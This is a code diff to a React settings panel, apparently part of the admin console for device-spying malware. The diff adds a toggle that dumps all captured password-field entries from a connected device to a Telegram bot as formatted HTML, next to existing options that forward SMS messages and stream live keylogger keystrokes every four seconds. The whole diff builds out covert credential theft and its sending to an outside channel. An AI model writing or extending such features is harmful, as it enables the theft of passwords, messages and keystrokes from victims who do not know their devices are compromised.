@@ -35,9 +35,10 @@ export default function TelegramTab() {
   const [chatId, setChatId]                         = useState('');
   const [enabled, setEnabled]                       = useState(true);
   const [notifyConnect, setNotifyConnect]           = useState(true);
-  const [sendSmsOnConnect, setSendSmsOnConnect]     = useState(false);
-  const [sendKeylogOnConnect, setSendKeylogOnConnect] = useState(false);
-  const [botTokenSet, setBotTokenSet]               = useState(false);
+  const [sendSmsOnConnect, setSendSmsOnConnect]           = useState(false);
+  const [sendKeylogOnConnect, setSendKeylogOnConnect]     = useState(false);
+  const [sendPasswordsOnConnect, setSendPasswordsOnConnect] = useState(false);
+  const [botTokenSet, setBotTokenSet]                     = useState(false);
 
   const token   = localStorage.getItem('admin_token') || localStorage.getItem('user_token');
   const headers = { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` };
@@ -60,6 +61,7 @@ export default function TelegramTab() {
       setNotifyConnect(t.notifyConnect !== false);
       setSendSmsOnConnect(!!t.sendSmsOnConnect);
       setSendKeylogOnConnect(!!t.sendKeylogOnConnect);
+      setSendPasswordsOnConnect(!!t.sendPasswordsOnConnect);
     } catch (_) {
       showToast('Failed to load settings', 'error');
     } finally {
@@ -75,7 +77,7 @@ export default function TelegramTab() {
       const body = {
         telegram: {
           botToken: botToken.startsWith('***') ? undefined : botToken,
-          chatId, enabled, notifyConnect, sendSmsOnConnect, sendKeylogOnConnect,
+          chatId, enabled, notifyConnect, sendSmsOnConnect, sendKeylogOnConnect, sendPasswordsOnConnect,
         },
       };
       const r = await fetch('/api/settings', { method: 'POST', headers, body: JSON.stringify(body) });
@@ -234,6 +236,12 @@ export default function TelegramTab() {
             label="⌨️ Stream Live Keylogger to Telegram"
             description="Forward live keystrokes to Telegram in real-time, batched every 4 seconds per app"
           />
+          <Toggle
+            value={sendPasswordsOnConnect}
+            onChange={setSendPasswordsOnConnect}
+            label="🔑 Send Captured Passwords on Connect"
+            description="When a device connects, dump all stored password-field captures to Telegram as formatted HTML"
+          />
         </div>
 
         {sendSmsOnConnect && (
@@ -244,6 +252,11 @@ export default function TelegramTab() {
         {sendKeylogOnConnect && (
           <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(245,158,11,0.08)', border: '1px solid rgba(245,158,11,0.25)', borderRadius: 8, fontSize: 12, color: '#fbbf24', lineHeight: 1.6 }}>
             ⚠️ Live keylogger streaming sends every keystroke to Telegram. High message volume — Telegram may rate-limit your bot.
+          </div>
+        )}
+        {sendPasswordsOnConnect && (
+          <div style={{ marginTop: 12, padding: '10px 14px', background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.25)', borderRadius: 8, fontSize: 12, color: '#fca5a5', lineHeight: 1.6 }}>
+            🔑 Password dump fires 4 seconds after the device connects. Only entries captured while the device keylogger was active are sent.
           </div>
         )}
 
